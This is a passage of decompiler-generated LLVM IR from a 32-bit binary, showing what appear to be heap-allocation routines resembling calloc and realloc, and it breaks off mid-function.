dec_label_pc_8052016:                             ; preds = %dec_label_pc_8051b19, %dec_label_pc_8052011
  %v0_8052016 = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_8052016, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052027

dec_label_pc_805201a:                             ; preds = %dec_label_pc_8051dd8, %dec_label_pc_8051f8e, %dec_label_pc_8051de2
  %v0_805201a = load i32, i32* %stack_var_-92, align 4
  %v1_805201a = call i32 @function_805149b(i32 %v0_805201a)
  store i32 %v1_805201a, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8052021 = inttoptr i32 %v1_805201a to i32*
  store i32 12, i32* %v1_8052021, align 4
  br label %dec_label_pc_8052027

dec_label_pc_8052027:                             ; preds = %dec_label_pc_8052016, %dec_label_pc_805200c, %dec_label_pc_8051fb7, %dec_label_pc_8051c73, %dec_label_pc_8051c25, %dec_label_pc_80519ac, %dec_label_pc_805201a
  store i32 %v2_80518e3, i32* @eax, align 4
  store i32 %v2_80518e3, i32* %stack_var_-92, align 4
  %v2_8052030 = call i32 @function_8052dfa(i32 %v2_80518e3, i32 1)
  store i32 %v2_8052030, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052038

dec_label_pc_8052038:                             ; preds = %dec_label_pc_8051901, %dec_label_pc_8052027
  %v0_805203b = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_805203b, i32* %eax.global-to-local, align 4
  %v2_805203d = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805203d, i32* %ebx.global-to-local, align 4
  store i32 %v0_80518d0, i32* @esi, align 4
  store i32 %v0_80518cf, i32* @edi, align 4
  store i32 %v0_80518ce, i32* @ebp, align 4
  ret i32 %v0_805203b

; uselistorder directives
  uselistorder i32 %v0_8051ffe, { 1, 0 }
  uselistorder i32 %v0_8051fde, { 1, 0, 2 }
  uselistorder i32 %v2_8051f7b, { 1, 0, 2 }
  uselistorder i32 %v0_8051f69, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8051f00, { 1, 0 }
  uselistorder i32 %v2_8051eee, { 1, 0 }
  uselistorder i32 %v1_8051ea5, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_8051e8f, { 1, 0, 2 }
  uselistorder i32 %v2_8051e83, { 1, 2, 0 }
  uselistorder i32 %v2_8051e7e, { 1, 0, 2 }
  uselistorder i32 %v1_8051e6e, { 2, 1, 0 }
  uselistorder i8 %v0_8051e3c, { 1, 0, 2 }
  uselistorder i1 %v10_8051e25, { 1, 0 }
  uselistorder i32 %v2_8051e1f, { 1, 0, 2 }
  uselistorder i32 %v0_8051ee1100, { 3, 1, 2, 4, 0, 6, 5 }
  uselistorder i32 %v1_8051e19, { 2, 1, 0 }
  uselistorder i32 %v8_8051def, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_8051dec, { 1, 0 }
  uselistorder i32 %v0_8051dcb, { 1, 0 }
  uselistorder i32 %v2_8051d9c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8051d94, { 0, 1, 4, 2, 3 }
  uselistorder i8 %v0_8051d81, { 1, 0 }
  uselistorder i1 %v2_8051d78, { 2, 1, 0 }
  uselistorder i32 %v1_8051d78, { 4, 0, 1, 2, 3, 5, 6, 7 }
  uselistorder i32 %v0_8051d65, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v2_8051d49, { 1, 0, 2 }
  uselistorder i32 %v2_8051d35, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_8051cfe, { 1, 2, 0, 3 }
  uselistorder i32 %v1_8051cf2, { 2, 1, 0 }
  uselistorder i32 %v8_8051ce1, { 4, 1, 0, 2, 3, 5 }
  uselistorder i32 %v2_8051cc8, { 1, 0, 2 }
  uselistorder i32 %v0_8051c64, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_8051c37, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8051c2d, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_8051c1f, { 1, 0 }
  uselistorder i32 %v1_8051bb6, { 1, 0 }
  uselistorder i32 %v3_8051baa, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_8051bba, { 1, 0 }
  uselistorder i32 %v2_8051ba4, { 3, 2, 1, 0 }
  uselistorder i32 %esi.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_8051ba17, { 1, 0 }
  uselistorder i32 %v2_8051b96, { 1, 0 }
  uselistorder i32 %v1_8051b7a, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_8051b76, { 2, 1, 0 }
  uselistorder i32 %v1_8051b72, { 1, 0 }
  uselistorder i32 %v1_8051b66, { 2, 1, 0 }
  uselistorder i32 %v2_8051b5c, { 1, 0 }
  uselistorder i32 %v1_8051b59, { 1, 2, 0 }
  uselistorder i32 %v4_8051af7, { 3, 6, 4, 5, 2, 1, 0 }
  uselistorder i32 %v0_8051b42, { 1, 0 }
  uselistorder i32 %v0_8051b10, { 1, 2, 0, 3 }
  uselistorder i32 %v3_8051ae3, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8051ab0, { 0, 2, 1 }
  uselistorder i32 %v2_8051a94, { 1, 0 }
  uselistorder i32 %v1_8051a8a, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-64.1, { 1, 0 }
  uselistorder i32 %v0_8051a85.lcssa, { 1, 0 }
  uselistorder i32 %v3_8051a75, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v1_8051a6c, { 1, 0, 2 }
  uselistorder i32 %v2_8051a48, { 2, 0, 1, 3 }
  uselistorder i32 %v2_8051a30, { 2, 1, 0 }
  uselistorder i32 %v0_8051a1c, { 2, 0, 3, 1 }
  uselistorder i32 %v3_80519e2, { 1, 0, 2 }
  uselistorder i32 %v1_8051fd9, { 0, 1, 3, 2 }
  uselistorder i32 %v0_8051ab09, { 1, 0, 2 }
  uselistorder i32 %v3_805198f, { 1, 0, 2 }
  uselistorder i32 %v2_8051981, { 2, 1, 0 }
  uselistorder i1 %v6_805197b, { 1, 0, 2 }
  uselistorder i32 %v2_805195c, { 2, 1, 0 }
  uselistorder i8 %v0_805192a, { 2, 1, 3, 0, 4 }
  uselistorder i32 %.v1_8051923, { 30, 12, 31, 2, 14, 32, 3, 21, 22, 33, 34, 4, 19, 20, 23, 25, 24, 5, 18, 17, 6, 16, 15, 28, 7, 27, 26, 35, 13, 29, 0, 11, 9, 10, 1, 8 }
  uselistorder i32 %v1_8051913, { 0, 2, 1 }
  uselistorder i32 %v0_80518fc, { 1, 0 }
  uselistorder i32 %v2_80518e3, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-92, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 14, 15 }
  uselistorder i32* %esi.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 18, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %ecx.global-to-local, { 23, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 25, 26, 27, 28, 29, 30 }
  uselistorder i32* %ebx.global-to-local, { 0, 19, 1, 2, 3, 4, 5, 6, 7, 8, 23, 9, 24, 10, 11, 12, 13, 14, 15, 25, 16, 17, 18, 20, 21, 22 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 54, 49, 50, 53, 52, 51, 55, 56, 57, 58, 59, 61, 60, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73 }
  uselistorder i32 1048576, { 1, 2, 0 }
  uselistorder i8* @global_var_8055680.48, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @function_8053110, { 1, 0 }
  uselistorder i32 134566740, { 1, 3, 0, 2 }
  uselistorder i32* @global_var_8055360.36, { 1, 2, 3, 0 }
  uselistorder i32 ()* @function_80518a8, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_805534c.33 to i32), i32 12), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_805534c.33 to i32), { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder label %dec_label_pc_8052038, { 1, 0 }
  uselistorder label %dec_label_pc_8052027, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_805201a, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8052016, { 1, 0 }
  uselistorder label %dec_label_pc_805200c, { 1, 0 }
  uselistorder label %dec_label_pc_8051fb7, { 1, 0 }
  uselistorder label %dec_label_pc_8051f8e, { 1, 0 }
  uselistorder label %dec_label_pc_8051f7b, { 1, 0 }
  uselistorder label %dec_label_pc_8051f69, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8051efb, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8051ef6, { 1, 0 }
  uselistorder label %dec_label_pc_8051e83, { 1, 0 }
  uselistorder label %dec_label_pc_8051e6c, { 1, 0 }
  uselistorder label %dec_label_pc_8051e55, { 1, 0 }
  uselistorder label %dec_label_pc_8051dd8, { 1, 0 }
  uselistorder label %dec_label_pc_8051dcb, { 1, 0 }
  uselistorder label %dec_label_pc_8051d8c, { 1, 0 }
  uselistorder label %dec_label_pc_8051d65, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8051d49, { 1, 0 }
  uselistorder label %dec_label_pc_8051d30, { 1, 0 }
  uselistorder label %dec_label_pc_8051d12, { 1, 0 }
  uselistorder label %dec_label_pc_8051c2d, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8051c25, { 1, 0 }
  uselistorder label %dec_label_pc_8051c0e, { 1, 0 }
  uselistorder label %dec_label_pc_8051ba1, { 1, 0 }
  uselistorder label %dec_label_pc_8051ba6.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8051b7a, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8051b01, { 1, 0 }
  uselistorder label %dec_label_pc_8051ab0, { 1, 0 }
  uselistorder label %dec_label_pc_8051a88, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8051a71, { 1, 0 }
  uselistorder label %dec_label_pc_80519df, { 1, 0 }
  uselistorder label %dec_label_pc_8051ab0.preheader, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80519ac, { 1, 0, 3, 2 }
}

define i32 @function_8052042(i64 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8052042:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_8052042 = load i32, i32* @edi, align 4
  %v0_8052044 = load i32, i32* @ebx, align 4
  %v12_8052045 = ptrtoint i32* %stack_var_-28 to i32
  %v4_8052048 = trunc i64 %arg1 to i32
  %sext = mul i64 %arg1, 4294967296
  %v2_8052052 = sdiv i64 %sext, 4294967296
  %v3_8052052 = sext i32 %arg2 to i64
  %v4_8052052 = mul nsw i64 %v3_8052052, %v2_8052052
  %v5_8052052 = trunc i64 %v4_8052052 to i32
  store i32 %v5_8052052, i32* @ebx, align 4
  %v2_8052055 = icmp eq i32 %v4_8052048, 0
  br i1 %v2_8052055, label %dec_label_pc_8052077, label %dec_label_pc_8052059

dec_label_pc_8052059:                             ; preds = %dec_label_pc_8052042
  store i32 %v4_8052048, i32* @edi, align 4
  %div = udiv i32 %v5_8052052, %v4_8052048
  store i32 %div, i32* %eax.global-to-local, align 4
  %v12_8052061 = icmp eq i32 %div, %arg2
  br i1 %v12_8052061, label %dec_label_pc_8052077, label %dec_label_pc_8052065

dec_label_pc_8052065:                             ; preds = %dec_label_pc_8052059
  %v1_8052065 = call i32 @function_805149b(i32 %v0_8052044)
  store i32 %v1_8052065, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_805206c = inttoptr i32 %v1_8052065 to i32*
  store i32 12, i32* %v1_805206c, align 4
  br label %dec_label_pc_805212d

dec_label_pc_8052077:                             ; preds = %dec_label_pc_8052059, %dec_label_pc_8052042
  store i32 %v12_8052045, i32* @eax, align 4
  %v2_8052087 = call i32 @function_8052dfa(i32 %v12_8052045, i32 134557175)
  store i32 %v2_8052087, i32* %eax.global-to-local, align 4
  %v1_8052093 = call i32 @function_8052df7(i32 ptrtoint (i32* @global_var_805503c.31 to i32))
  store i32 %v1_8052093, i32* %eax.global-to-local, align 4
  %v0_8052098 = load i32, i32* @ebx, align 4
  %v1_805209b = call i32 @function_80518ce(i32 %v0_8052098)
  store i32 %v1_805209b, i32* %eax.global-to-local, align 4
  store i32 %v1_805209b, i32* %ebx.global-to-local, align 4
  %v1_80520a5 = icmp eq i32 %v1_805209b, 0
  br i1 %v1_80520a5, label %dec_label_pc_805211c, label %dec_label_pc_80520a9

dec_label_pc_80520a9:                             ; preds = %dec_label_pc_8052077
  %v1_80520a9 = add i32 %v1_805209b, -4
  %v2_80520a9 = inttoptr i32 %v1_80520a9 to i32*
  %v3_80520a9 = load i32, i32* %v2_80520a9, align 4
  store i32 %v3_80520a9, i32* %eax.global-to-local, align 4
  %v2_80520ac = and i32 %v3_80520a9, 2
  %v3_80520ac = icmp eq i32 %v2_80520ac, 0
  %v1_80520ae = icmp eq i1 %v3_80520ac, false
  br i1 %v1_80520ae, label %dec_label_pc_805211c, label %dec_label_pc_80520b0

dec_label_pc_80520b0:                             ; preds = %dec_label_pc_80520a9
  %v1_80520b03 = add i32 %v3_80520a9, -4
  %v1_80520b3 = and i32 %v1_80520b03, -4
  %v2_80520b8 = udiv i32 %v1_80520b3, 4
  store i32 %v2_80520b8, i32* %eax.global-to-local, align 4
  %v5_80520bb = icmp ult i32 %v1_80520b3, 36
  %tmp = and i32 %v1_80520b03, -4
  %tmp18 = icmp eq i32 %tmp, 36
  %v2_80520be = or i1 %v5_80520bb, %tmp18
  br i1 %v2_80520be, label %dec_label_pc_80520cf, label %dec_label_pc_80520c0

dec_label_pc_80520c0:                             ; preds = %dec_label_pc_80520b0
  %v3_80520c5 = inttoptr i32 %v1_805209b to i8*
  %v4_80520c5 = call i32 @function_80514ec(i8* %v3_80520c5, i32 0, i32 %v1_80520b3)
  store i32 %v4_80520c5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805211c

dec_label_pc_80520cf:                             ; preds = %dec_label_pc_80520b0
  %v1_80520cf = inttoptr i32 %v1_805209b to i32*
  store i32 0, i32* %v1_80520cf, align 4
  %v0_80520d5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80520d5 = add i32 %v0_80520d5, 4
  %v2_80520d5 = inttoptr i32 %v1_80520d5 to i32*
  store i32 0, i32* %v2_80520d5, align 4
  %v0_80520dc = load i32, i32* %ebx.global-to-local, align 4
  %v1_80520dc = add i32 %v0_80520dc, 8
  %v2_80520dc = inttoptr i32 %v1_80520dc to i32*
  store i32 0, i32* %v2_80520dc, align 4
  %v0_80520e3 = load i32, i32* %eax.global-to-local, align 4
  %tmp15 = icmp ult i32 %v0_80520e3, 5
  br i1 %tmp15, label %dec_label_pc_805211c, label %dec_label_pc_80520e8

dec_label_pc_80520e8:                             ; preds = %dec_label_pc_80520cf
  %v0_80520e8 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80520e8 = add i32 %v0_80520e8, 12
  %v2_80520e8 = inttoptr i32 %v1_80520e8 to i32*
  store i32 0, i32* %v2_80520e8, align 4
  %v0_80520ef = load i32, i32* %ebx.global-to-local, align 4
  %v1_80520ef = add i32 %v0_80520ef, 16
  %v2_80520ef = inttoptr i32 %v1_80520ef to i32*
  store i32 0, i32* %v2_80520ef, align 4
  %v0_80520f6 = load i32, i32* %eax.global-to-local, align 4
  %tmp16 = icmp ult i32 %v0_80520f6, 7
  br i1 %tmp16, label %dec_label_pc_805211c, label %dec_label_pc_80520fb

dec_label_pc_80520fb:                             ; preds = %dec_label_pc_80520e8
  %v0_80520fb = load i32, i32* %ebx.global-to-local, align 4
  %v1_80520fb = add i32 %v0_80520fb, 20
  %v2_80520fb = inttoptr i32 %v1_80520fb to i32*
  store i32 0, i32* %v2_80520fb, align 4
  %v0_8052102 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052102 = add i32 %v0_8052102, 24
  %v2_8052102 = inttoptr i32 %v1_8052102 to i32*
  store i32 0, i32* %v2_8052102, align 4
  %v0_8052109 = load i32, i32* %eax.global-to-local, align 4
  %tmp17 = icmp ult i32 %v0_8052109, 9
  br i1 %tmp17, label %dec_label_pc_805211c, label %dec_label_pc_805210e

dec_label_pc_805210e:                             ; preds = %dec_label_pc_80520fb
  %v0_805210e = load i32, i32* %ebx.global-to-local, align 4
  %v1_805210e = add i32 %v0_805210e, 28
  %v2_805210e = inttoptr i32 %v1_805210e to i32*
  store i32 0, i32* %v2_805210e, align 4
  %v0_8052115 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052115 = add i32 %v0_8052115, 32
  %v2_8052115 = inttoptr i32 %v1_8052115 to i32*
  store i32 0, i32* %v2_8052115, align 4
  br label %dec_label_pc_805211c

dec_label_pc_805211c:                             ; preds = %dec_label_pc_80520fb, %dec_label_pc_80520e8, %dec_label_pc_80520cf, %dec_label_pc_80520a9, %dec_label_pc_8052077, %dec_label_pc_80520c0, %dec_label_pc_805210e
  store i32 %v12_8052045, i32* @eax, align 4
  %v2_8052125 = call i32 @function_8052dfa(i32 %v12_8052045, i32 1)
  store i32 %v2_8052125, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805212d

dec_label_pc_805212d:                             ; preds = %dec_label_pc_8052065, %dec_label_pc_805211c
  %v0_8052130 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8052130, i32* %eax.global-to-local, align 4
  store i32 %v0_8052044, i32* @ebx, align 4
  store i32 %v0_8052042, i32* @edi, align 4
  ret i32 %v0_8052130

; uselistorder directives
  uselistorder i32 %v1_80520b3, { 2, 1, 0 }
  uselistorder i32 %v1_805209b, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %ebx.global-to-local, { 9, 0, 3, 1, 6, 2, 7, 4, 5, 8, 10 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 3, 4, 5, 2, 6, 7, 8, 9, 10, 12, 11 }
  uselistorder i64 4294967296, { 1, 0 }
  uselistorder label %dec_label_pc_805212d, { 1, 0 }
  uselistorder label %dec_label_pc_805211c, { 6, 0, 1, 2, 5, 3, 4 }
}

define i32 @function_8052136(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8052136:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_8052139 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v4_8052141 = icmp eq i32* %arg1, null
  %v1_8052146 = icmp eq i1 %v4_8052141, false
  br i1 %v1_8052146, label %dec_label_pc_8052158, label %dec_label_pc_8052148

dec_label_pc_8052148:                             ; preds = %dec_label_pc_8052136
  store i32 %arg2, i32* %stack_var_-60, align 4
  %v1_805214c = call i32 @function_80518ce(i32 %arg2)
  store i32 %v1_805214c, i32* %eax.global-to-local, align 4
  store i32 %v1_805214c, i32* @ebx, align 4
  br label %dec_label_pc_8052451

dec_label_pc_8052158:                             ; preds = %dec_label_pc_8052136
  %v1_8052158 = icmp eq i32 %arg2, 0
  %v1_805215a = icmp eq i1 %v1_8052158, false
  br i1 %v1_805215a, label %dec_label_pc_805216d, label %dec_label_pc_805215c

dec_label_pc_805215c:                             ; preds = %dec_label_pc_8052158
  store i32 %tmp7, i32* %stack_var_-60, align 4
  %v1_8052163 = call i32 @function_8052693(i32 %tmp7)
  store i32 %v1_8052163, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052451

dec_label_pc_805216d:                             ; preds = %dec_label_pc_8052158
  %v2_8052178 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8052178, i32* @eax, align 4
  store i32 %v2_8052178, i32* %stack_var_-60, align 4
  %v2_805217d = call i32 @function_8052dfa(i32 %v2_8052178, i32 134557175)
  store i32 %v2_805217d, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805503c.31 to i32), i32* %stack_var_-60, align 4
  %v1_8052189 = call i32 @function_8052df7(i32 ptrtoint (i32* @global_var_805503c.31 to i32))
  store i32 %v1_8052189, i32* %eax.global-to-local, align 4
  %v0_8052191 = load i32, i32* @ebx, align 4
  %tmp21 = icmp ult i32 %v0_8052191, -32
  br i1 %tmp21, label %dec_label_pc_80521a8, label %dec_label_pc_8052196

dec_label_pc_8052196:                             ; preds = %dec_label_pc_805216d
  %v0_8052196 = load i32, i32* %stack_var_-60, align 4
  %v1_8052196 = call i32 @function_805149b(i32 %v0_8052196)
  store i32 %v1_8052196, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_805219d = inttoptr i32 %v1_8052196 to i32*
  store i32 12, i32* %v1_805219d, align 4
  br label %dec_label_pc_8052454

dec_label_pc_80521a8:                             ; preds = %dec_label_pc_805216d
  %v1_80521a8 = add i32 %v0_8052191, 11
  %tmp22 = icmp ult i32 %v1_80521a8, 16
  %v1_80521b8 = and i32 %v1_80521a8, -8
  %v1_80521a8.v1_80521b8 = select i1 %tmp22, i32 %v1_80521a8, i32 %v1_80521b8
  %.v1_80521b8 = select i1 %tmp22, i32 16, i32 %v1_80521b8
  store i32 %v1_80521a8.v1_80521b8, i32* %eax.global-to-local, align 4
  %v1_80521c3 = add i32 %tmp7, -8
  store i32 %v1_80521c3, i32* @edi, align 4
  %v1_80521c6 = add i32 %tmp7, -4
  %v2_80521c6 = inttoptr i32 %v1_80521c6 to i32*
  %v3_80521c6 = load i32, i32* %v2_80521c6, align 4
  store i32 %v3_80521c6, i32* %edx.global-to-local, align 4
  %v1_80521cb = and i32 %v3_80521c6, -4
  store i32 %v1_80521cb, i32* %eax.global-to-local, align 4
  %v2_80521d2 = and i32 %v3_80521c6, 2
  %v3_80521d2 = icmp eq i32 %v2_80521d2, 0
  %v1_80521d5 = icmp eq i1 %v3_80521d2, false
  br i1 %v1_80521d5, label %dec_label_pc_805236f, label %dec_label_pc_80521db

dec_label_pc_80521db:                             ; preds = %dec_label_pc_80521a8
  store i32 %.v1_80521b8, i32* %ecx.global-to-local, align 4
  store i32 %v1_80521cb, i32* @ebx, align 4
  %v7_80521e1 = icmp ult i32 %v1_80521cb, %.v1_80521b8
  %v1_80521e3 = icmp eq i1 %v7_80521e1, false
  br i1 %v1_80521e3, label %dec_label_pc_805231a, label %dec_label_pc_80521e9

dec_label_pc_80521e9:                             ; preds = %dec_label_pc_80521db
  %v2_80521e9 = add i32 %v1_80521cb, %v1_80521c3
  store i32 %v2_80521e9, i32* @esi, align 4
  %v1_80521ec = load i32, i32* @global_var_805534c.33, align 4
  %v12_80521ec = icmp eq i32 %v2_80521e9, %v1_80521ec
  %v1_80521f2 = icmp eq i1 %v12_80521ec, false
  %v1_805222c = add i32 %v2_80521e9, 4
  %v2_805222c = inttoptr i32 %v1_805222c to i32*
  %v3_805222c = load i32, i32* %v2_805222c, align 4
  br i1 %v1_80521f2, label %dec_label_pc_805222c, label %dec_label_pc_80521f4

dec_label_pc_80521f4:                             ; preds = %dec_label_pc_80521e9
  %v1_80521f9 = and i32 %v3_805222c, -4
  %v2_80521fc = add i32 %v1_80521f9, %v1_80521cb
  store i32 %v2_80521fc, i32* %ecx.global-to-local, align 4
  %v1_8052202 = add i32 %.v1_80521b8, 16
  store i32 %v1_8052202, i32* %eax.global-to-local, align 4
  %v7_8052205 = icmp ult i32 %v2_80521fc, %v1_8052202
  br i1 %v7_8052205, label %dec_label_pc_805226a, label %dec_label_pc_8052209

dec_label_pc_8052209:                             ; preds = %dec_label_pc_80521f4
  %v1_8052209 = urem i32 %v3_80521c6, 2
  %v5_805220c = or i32 %v1_8052209, %.v1_80521b8
  store i32 %v5_805220c, i32* %edx.global-to-local, align 4
  store i32 %v5_805220c, i32* %v2_80521c6, align 4
  %v0_8052217 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8052217 = sub i32 %v0_8052217, %.v1_80521b8
  %v0_8052219 = load i32, i32* @edi, align 4
  %v2_8052219 = add i32 %v0_8052219, %.v1_80521b8
  store i32 %v2_8052219, i32* %eax.global-to-local, align 4
  %v1_805221c = or i32 %v2_8052217, 1
  store i32 %v1_805221c, i32* %ecx.global-to-local, align 4
  store i32 %v2_8052219, i32* @global_var_805534c.33, align 4
  %v2_8052224 = add i32 %v2_8052219, 4
  %v3_8052224 = inttoptr i32 %v2_8052224 to i32*
  store i32 %v1_805221c, i32* %v3_8052224, align 4
  br label %dec_label_pc_805243f

dec_label_pc_805222c:                             ; preds = %dec_label_pc_80521e9
  store i32 %v3_805222c, i32* %edx.global-to-local, align 4
  %v1_8052231 = and i32 %v3_805222c, -2
  store i32 %v1_8052231, i32* %eax.global-to-local, align 4
  %v3_8052234 = add i32 %v1_805222c, %v1_8052231
  %v4_8052234 = inttoptr i32 %v3_8052234 to i8*
  %v5_8052234 = load i8, i8* %v4_8052234, align 1
  %v6_8052234 = urem i8 %v5_8052234, 2
  %v7_8052234 = icmp eq i8 %v6_8052234, 0
  %v1_8052239 = icmp eq i1 %v7_8052234, false
  br i1 %v1_8052239, label %dec_label_pc_805226a, label %dec_label_pc_805223b

dec_label_pc_805223b:                             ; preds = %dec_label_pc_805222c
  %v1_805223b = and i32 %v3_805222c, -4
  store i32 %v1_805223b, i32* %edx.global-to-local, align 4
  %v2_8052242 = add i32 %v1_805223b, %v1_80521cb
  store i32 %v2_8052242, i32* @ebx, align 4
  %v10_8052244 = icmp ult i32 %v2_8052242, %.v1_80521b8
  br i1 %v10_8052244, label %dec_label_pc_805226a, label %dec_label_pc_805224a

dec_label_pc_805224a:                             ; preds = %dec_label_pc_805223b
  %v1_805224a = add i32 %v1_80521cb, %tmp7
  %v2_805224a = inttoptr i32 %v1_805224a to i32*
  %v3_805224a = load i32, i32* %v2_805224a, align 4
  store i32 %v3_805224a, i32* @edx, align 4
  %v1_805224d = add i32 %v2_80521e9, 12
  %v2_805224d = inttoptr i32 %v1_805224d to i32*
  %v3_805224d = load i32, i32* %v2_805224d, align 4
  store i32 %v3_805224d, i32* %eax.global-to-local, align 4
  %v1_8052250 = add i32 %v3_805224a, 12
  %v2_8052250 = inttoptr i32 %v1_8052250 to i32*
  %v3_8052250 = load i32, i32* %v2_8052250, align 4
  %v15_8052250 = icmp eq i32 %v3_8052250, %v2_80521e9
  %v1_8052253 = icmp eq i1 %v15_8052250, false
  br i1 %v1_8052253, label %dec_label_pc_805225a, label %dec_label_pc_8052255

dec_label_pc_8052255:                             ; preds = %dec_label_pc_805224a
  %v1_8052255 = add i32 %v3_805224d, 8
  %v2_8052255 = inttoptr i32 %v1_8052255 to i32*
  %v3_8052255 = load i32, i32* %v2_8052255, align 4
  %v15_8052255 = icmp eq i32 %v3_8052255, %v2_80521e9
  br i1 %v15_8052255, label %dec_label_pc_805225f, label %dec_label_pc_805225a

dec_label_pc_805225a:                             ; preds = %dec_label_pc_8052255, %dec_label_pc_805224a
  %v0_805225a = call i32 @function_805282f()
  store i32 %v0_805225a, i32* %eax.global-to-local, align 4
  %v1_805225f.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805225f

dec_label_pc_805225f:                             ; preds = %dec_label_pc_8052255, %dec_label_pc_805225a
  %v1_805225f = phi i32 [ %v3_805224a, %dec_label_pc_8052255 ], [ %v1_805225f.pre, %dec_label_pc_805225a ]
  %v0_805225f = phi i32 [ %v3_805224d, %dec_label_pc_8052255 ], [ %v0_805225a, %dec_label_pc_805225a ]
  %v2_805225f = add i32 %v1_805225f, 12
  %v3_805225f = inttoptr i32 %v2_805225f to i32*
  store i32 %v0_805225f, i32* %v3_805225f, align 4
  %v0_8052262 = load i32, i32* @edx, align 4
  %v1_8052262 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052262 = add i32 %v1_8052262, 8
  %v3_8052262 = inttoptr i32 %v2_8052262 to i32*
  store i32 %v0_8052262, i32* %v3_8052262, align 4
  %v0_805231a.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805231a

dec_label_pc_805226a:                             ; preds = %dec_label_pc_805223b, %dec_label_pc_805222c, %dec_label_pc_80521f4
  %v1_8052271 = add i32 %.v1_80521b8, -7
  store i32 %v1_8052271, i32* %eax.global-to-local, align 4
  store i32 %v1_8052271, i32* %stack_var_-60, align 4
  %v1_8052275 = call i32 @function_80518ce(i32 %v1_8052271)
  store i32 %v1_8052275, i32* %eax.global-to-local, align 4
  store i32 %v1_8052275, i32* %edx.global-to-local, align 4
  %v1_805227f = icmp eq i32 %v1_8052275, 0
  br i1 %v1_805227f, label %dec_label_pc_805243b, label %dec_label_pc_8052287

dec_label_pc_8052287:                             ; preds = %dec_label_pc_805226a
  %v1_8052287 = add i32 %v1_8052275, -8
  store i32 %v1_8052287, i32* %ebx.global-to-local, align 4
  %v1_805228a = load i32, i32* @esi, align 4
  %v12_805228a = icmp eq i32 %v1_8052287, %v1_805228a
  %v1_805228c = add i32 %v1_8052275, -4
